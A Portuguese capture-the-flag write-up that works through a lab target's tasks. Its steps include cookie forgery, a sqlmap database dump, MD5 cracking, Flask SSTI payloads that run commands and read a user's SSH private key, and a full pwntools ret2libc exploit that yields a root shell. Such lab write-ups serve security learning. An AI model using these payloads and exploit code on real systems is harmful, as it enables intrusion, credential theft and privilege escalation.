feito por F0x
alvo: tribopapaxota.org

## **Task Code - Script**
Analise todos os scripts.
```js
console.log("Hello, patonymous!");
```
### **Solução**
![nmap](https://github.com/user-attachments/assets/d9fa24ac-cfb6-4dd8-b27d-28c1aad621da)

acessando tribopapaxota.org, vi tava vazio ent ja fiz um scan de diretorios com o feroxbuster

![feroxbuster](https://github.com/user-attachments/assets/fc895173-f09e-4569-b7bc-01fec07fe920)

visto o nome da task, dei uma olhada no http://tribopapaxota.org:8888/static/scripts.js
e essa função pareceu interessante:

`function blob(){let _=String.fromCharCode(...[81,85,65,67,75,123,74,53,95,99,52,110,95,108,51,52,100,95,49,110,102,48,114,109,52,55,49,48,110,53,125]);return _;}`

pondo no CyberChef: QUACK{J5_c4n_l34d_1nf0rm4710n5}

## **Task OSINT - Matrix**
Apenas conecte-se e descubra.
`nc tribopapaxota.org 1337`
### **Solução**
![nc_matrix](https://github.com/user-attachments/assets/699ca483-b804-44ef-81d5-9f7220b77f3f)

pesquisei por "Trinity hacks City Power Grid in Matrix", e procurei nas imagens, ate achar algo que me desse informações como por exemplo: 

![matrix](https://github.com/user-attachments/assets/6e1aa7a6-9ea0-4ba4-a5e8-d0bfaebc62c3)

Abri a imagem, e tentei Z10N0101

![nc_matrix2](https://github.com/user-attachments/assets/ab3847bc-ed85-4048-815d-77fc0ab7a41b)

Essa foi facil, uma rapida pesquisa ja da a resposta, Zion

![nc_matrix3](https://github.com/user-attachments/assets/b2371c49-a948-4746-a35e-155673d703a3)
 
QUACK{Z10N0101_M0rph3u5_h45_f0und_h15_Ch053n_0n3}


## **Task Endpoint - Endpoint**
Encontre o endpoint que está vazando informações confidenciais.
### **Solução**
Desde que já tinhamos encontrado o endpoint api, desconfiei e rodei um scan de endpoints de api

![feroxbuster2](https://github.com/user-attachments/assets/c257ca57-74f5-453e-b56c-845f6870a979)

Indo para o endpoints /api/v1/users/1

![api](https://github.com/user-attachments/assets/e77d038b-a61d-4b78-bc03-a7e1e46c981f)

QUACK{AP1_c4n_b3_vuln3r4bl3}


## **Task - Endpoint - MFA**
Outro endpoint que está vazando informações.
### **Solução**
http://tribopapaxota.org:8888/login
descobri duck:quack, mas precisava de MFA, ent vi q o user cat n precisava de MFA

![mfa](https://github.com/user-attachments/assets/757e0410-266d-4658-b3c8-5d248ad66a0d)

descobri cat:meow

![welcome](https://github.com/user-attachments/assets/84ac806e-905d-4755-be3c-2f41a955c31e)

olhei as cookies
Y2F0OjRhNGJlNDBjOTZhYzYzMTRlOTFkOTNmMzgwNDNhNjM0
(base64) -> cat:4a4be40c96ac6314e91d93f38043a634

usando https://crackstation.net/

![crack](https://github.com/user-attachments/assets/c126845d-6069-40a7-990f-e22a1bb221b5)

cookie parece ser (user):(hash md5 da pass) encodado em base64

vamos tentar com outros user, como duck
duck:cfaf278e8f522c72644cee2a753d2845 
(base64)-> ZHVjazpjZmFmMjc4ZThmNTIyYzcyNjQ0Y2VlMmE3NTNkMjg0NQ==

![welcome2](https://github.com/user-attachments/assets/f28a25b0-0794-4831-ad07-9d4be9cd1196)

Funciona!!

(fui pesquisando pelo barulho q os animais faziam para ver se conseguia achar a pass)
tiger:growl
bear: -
wolf:howl
fox:yip
eagle: -
shark: -
owl:hoot
dolphin: -
panda:bleat

(passado um tempo, decidi focar em outra coisa, e dps voltar aqui)


## **Task Injection - Dump**
Outro endpoint que está vazando informações.
### **Solução**
já tinha reparado q quando punha um `'` o erro era diferente.
Erro sem `'`

![login](https://github.com/user-attachments/assets/f5fdd4e5-a3c2-4a7c-b1dd-1301c263965e)

Erro com `'`

![login2](https://github.com/user-attachments/assets/f4c73ac9-ad29-4dab-8e15-5ec01e7b41d1)

Já que estava a ficar sem opções e teorias, rodei um sqlmap só por descargo de consciência (e não é que era mesmo...)
guardei a request acima (feita pelo burp) como request.txt, e rodei o comando:
`sqlmap -r request.txt --dump`

![dump](https://github.com/user-attachments/assets/8823754a-8af1-4d12-aa4d-0a48bedb6cf0)

QUACK{db_w45_dump3d}


## **Task Hash - F0x**
Qual a senha do usuário `fox`?
### **Solução**
como vimos anteriormente na DB dumpada conseguimos o hash do user fox: 66b6d4c61b23a85b8d375e77104b9e14
usei o https://crackstation.net -> yip (eu já tinha descoberto antes heheh)

QUACK{yip}


## **Task Hash - Dashboard**
Obtenha acesso acesso ao painel administrativo.
### **Solução**
Tentar ficar admin, fiz login com as credenciais cat:meow,
peguei nas credenciais do admin (user e hash md5):
admin:703b179695b26fc01e4b18e3e605de2a
(base64) -> YWRtaW46NzAzYjE3OTY5NWIyNmZjMDFlNGIxOGUzZTYwNWRlMmE=
troquei a cookie DUCKY para esta
E conseguimos admin

QUACK{4DM1N_15_N0T_S0_S3CUR3}


## **Task Hash - Dehash**
Qual a senha do usuário `admin`?
### **Solução**
`bopscrk -i`
(depois de várias tentativas e muitas horas)

![dehashed](https://github.com/user-attachments/assets/dcaf8f84-6006-4fa8-88fb-e9eb40de63b6)

`john hash.txt --wordlist=duckywalletV2.txt --format=Raw-MD5 --rules=best64 --fork=8`
admin:DuckyW4ll3t!!


## **Task Endpoint - MFA (CONTINUAÇÃO)**
(DPS DE 1-2 dias, muitas horas e muito fuzzing...)
A RESPOSTA TAVA NA CARA O TEMPO TODO
lembrei da BD dumpada, e da coluna totp_secret... (foi só parar e raciocinar) 
Ás vezes a parte manual é importante e não só a automatizada com tools

![mfa2](https://github.com/user-attachments/assets/8ccf3407-8a25-4fb8-83ef-0fc0ef12efbb)

QUACK{T0TP_g3n3r4t0r_1s_t00_much_d4ng3r0u5}


## **Task Injection - Flask**
Obtenha informações internas da aplicação Flask.
### **Solução**
(usei as dicas mas já suspeitava q era para explorar um SSTI num cookie, https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
tools usadas: cyberchef.io

`{{7*7}}`:703b179695b26fc01e4b18e3e605de2a (hash MD5 admin)
(base64) -> e3s3Kjd9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==

![ssti](https://github.com/user-attachments/assets/e0e88ff2-f2e4-44a8-88f2-ad2f283196ea)

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://github.com/payloadbox/ssti-payloads

Tentando alguns payloads chegamos a:
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`:703b179695b26fc01e4b18e3e605de2a (hash MD5 admin)
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdpZCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh

![ssti_id](https://github.com/user-attachments/assets/540a3440-6918-4206-9dec-7d8652b73ba9)

`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscycpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh 

![ssti_ls](https://github.com/user-attachments/assets/12441cf3-d150-41c8-a0ee-4f127e1fa1d3)

`{{config.__class__.__init__.__globals__['os'].popen('cat ./flag.txt').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdjYXQgLi9mbGFnLnR4dCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh

![ssti_cat](https://github.com/user-attachments/assets/30252881-b3b5-4f9c-a993-5f5a9edb4818)

QUACK{W17h_5571_RC3_15_v3ry_51mpl3}


## **Task Linux - Duck**
Você tem o suficiente para acessar o servidor!
### **Solução**
`{{config.__class__.__init__.__globals__['os'].popen('ls /home').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAvaG9tZScpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh

![ssti_ls2](https://github.com/user-attachments/assets/e928efc7-40e4-4932-9a93-5d13c92597d3)

`{{config.__class__.__init__.__globals__['os'].popen('ls -lah /home/duck').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAtbGFoIC9ob21lL2R1Y2snKS5yZWFkKCl9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==

![ssti_ls3](https://github.com/user-attachments/assets/d5a5c0e1-75bf-4313-83af-a5ba35cd7d7d)

Organizado:
total 100K 
drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 . 
drwxr-xr-x 4 root root 4.0K Aug 14 08:48 .. 
drwxr-xr-x 2 root root 4.0K Aug 22 17:46 .bash_history 
-rw-r--r-- 1 duck duck 220 Aug 14 08:48 .bash_logout 
-rw-r--r-- 1 duck duck 3.7K Aug 22 17:49 .bashrc 
drwxrwxr-x 3 duck duck 4.0K Aug 21 23:59 .cache 
drwx------ 3 duck duck 4.0K Aug 21 20:35 .config 
-rw------- 1 duck duck 20 Aug 22 04:07 .lesshst 
drwxrwxr-x 3 duck duck 4.0K Aug 21 20:45 .local 
drwxrwxr-x 2 duck duck 4.0K Aug 14 09:14 manutencao 
-rw-r--r-- 1 duck duck 807 Aug 14 08:48 .profile 
drwx------ 2 duck duck 4.0K Aug 14 08:50 .ssh 
-rw-rw-r-- 1 root root 27 Aug 22 00:37 wtduck.txt 
-rw-rw-r-- 1 duck duck 48K Aug 22 17:48 .zcompdump


`{{config.__class__.__init__.__globals__['os'].popen('ls -lah /home/duck/.ssh').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAtbGFoIC9ob21lL2R1Y2svLnNzaCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh

![ssti_ls4](https://github.com/user-attachments/assets/a262b00b-1205-47d4-9a16-60a892dd3aaa)

total 20K 
drwx------ 2 duck duck 4.0K Aug 14 08:50 . 
drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 .. 
-rw-rw-r-- 1 duck duck 570 Aug 14 08:50 authorized_keys 
-r-------- 1 duck duck 2.6K Aug 14 08:49 id_rsa 
-r--r--r-- 1 duck duck 570 Aug 14 08:49 id_rsa.pub

`{{config.__class__.__init__.__globals__['os'].popen('cat /home/duck/.ssh/id_rsa').read()}}`:703b179695b26fc01e4b18e3e605de2a
(base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdjYXQgL2hvbWUvZHVjay8uc3NoL2lkX3JzYScpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh

![id_rsa](https://github.com/user-attachments/assets/df5fbc76-cace-45dd-8570-6d4ddac07806)

copiar para id_rsa
`chmod 600 id_rsa`
`ssh -i id_rsa duck@tribopapaxota.org`

![duck](https://github.com/user-attachments/assets/ba7ce33b-060d-43f3-885d-a4e74f86fb9e)

QUACK{duck_h45_b33n_pwn3d}


Tive que deixar uma mensagem :)

![duck_message](https://github.com/user-attachments/assets/33a5cc90-8d11-4e8e-a39a-1d9c366467f4)

## **Task Linux - Root**
**WOOP WOOP GOT ROOT?** Suba ao topo da hierarquia e governe o sistema.
### **Resposta**
**Foram 3 dias de muito aprendizado e conhecimento adquirido, muitas tentativas e erros**

1. copiei para o meu PC os ficheiros duck2root e libc.so.6

![files](https://github.com/user-attachments/assets/2056bfdc-115c-448b-82aa-7d8c1d3c5ff5)

2. ja tinha visto alguns blogues sobre binary exploitation e lembrei do comando `checksec` para ver as proteções no binário

![checksec](https://github.com/user-attachments/assets/f00fa3e6-9b5d-48a6-bfcb-4ec6537764c4)

vi q tinha NX e fui pesquisar sobre "ELF binary exploitation NX bypass" e vi um termo um pouco familiar "ret2libc", pesquisando mais sobre encontrei o seguinte blog
https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
mas eu queria mais, procurando no YT por videos de ret2libc até que encontrei 
https://www.youtube.com/watch?v=tMN5N5oid2c
(era exatamente o que eu estava á procura, explicando em detalhe, cada passo, até um pouco de bases fundamentais)

O que instalar:
gbg gef - https://github.com/hugsy/gef
pwntools (pip3 install pwn)
pwninit - https://github.com/io12/pwninit/releases/download/3.3.1/pwninit

Depois de baixar o binário e a lib:
1. `pwninit --bin duck2root --libc libc.so.6`

![pwninit](https://github.com/user-attachments/assets/073a7873-c9ea-42ac-8d72-f0a01ec0991b)

2. `patchelf --set-interpreter ./ld-2.35.so ./duck2root` 
3. `checksec ./duck2root`

![checksec](https://github.com/user-attachments/assets/82966f97-6ed8-4629-af35-fca477911d34)

EXPLOIT QUE FINALMENTE FUNCIONA (depois de muitas iterações, perguntas e dúvidas)
```python
#!/usr/bin/env python3

from pwn import * 

exe = process('./duck2root_patched')
p = remote("localhost", 5001)

pop_rdi = 0x40126d
printf_at_got = 0x404018
puts_at_plt = 0x401030
ret_to_vuln = 0x401272

payload = b"A"*72
payload += p64(pop_rdi) # pop rdi; ret
payload += p64(printf_at_got) # printf got
payload += p64(puts_at_plt) # puts plt
payload += p64(ret_to_vuln) # return to ask 

p.sendlineafter("Patonymous?>\n",payload) # send payload

leak = u64(p.recvline().strip().ljust(8, b"\x00")) # leaked address

log.info(f"Leaked printf address: {hex(leak)}")

printf_offset = 0x606f0

base_address = leak - printf_offset # calculate base address libc
log.info(f"Leaked libc base address: {hex(base_address)}")
input()
libc_binsh = 0x1d8678 # offset /bin/sh
libc_system = 0x0000000000050d70 # offset system
log.info(f"Leaked libc system address: {hex(base_address + libc_system)}")

# second ROPchain (payload), now that its waiting to receive input

payload2 = b"A" * 72
payload2 += p64(pop_rdi)
payload2 += p64(base_address + libc_binsh) # libc -> /bin/sh > strings -a -t x ./libc.so.6 | grep "/bin/sh"
payload2 += p64(0x000000000040101a) # ret > ROPgadget --bin binary | grep ret
payload2 += p64(base_address + libc_system) # libc -> system
p.sendlineafter("Patonymous?>\n", payload2) # >;) - delivery payload

p.interactive()
```

![exploit](https://github.com/user-attachments/assets/244dffc7-2f64-4cf2-8669-5fea2c2e2207)

QUACK{R3t2l1bc_1s_t00_3a5y_t0_3xpl01t}

And ofc I had to leave a message as root to :)

![exploit_message](https://github.com/user-attachments/assets/8b8edaee-3e07-409f-927f-2d375637502d)
